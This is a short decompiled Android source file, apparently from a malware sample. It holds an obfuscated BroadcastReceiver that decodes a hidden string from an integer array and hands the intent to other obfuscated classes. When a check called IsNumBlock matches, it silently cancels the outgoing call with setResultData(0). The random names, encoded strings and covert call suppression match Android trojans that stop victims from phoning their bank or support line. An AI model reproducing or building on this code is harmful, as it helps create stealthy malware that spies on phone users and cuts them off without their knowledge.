package tev.piqgahor;
public class QBSTwdTWP extends android.content.BroadcastReceiver {

    public QBSTwdTWP()
    {
        return;
    }

    public void onReceive(android.content.Context p2, android.content.Intent p3)
    {
        if ((p2 != null) && (p3 != null)) {
            int v0_2 = new int[13];
            v0_2 = {42, 109, 139, 150, 150, 124, 143, 141, 143, 147, 160, 143, 156};
            tev.piqgahor.jzVO9lP4.yStpazw33441uh(p2, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_2), p3);
            if (tev.piqgahor.mlDMsT43cl.IsNumBlock(p3)) {
                this.setResultData(0);
            }
        }
        return;
    }
}
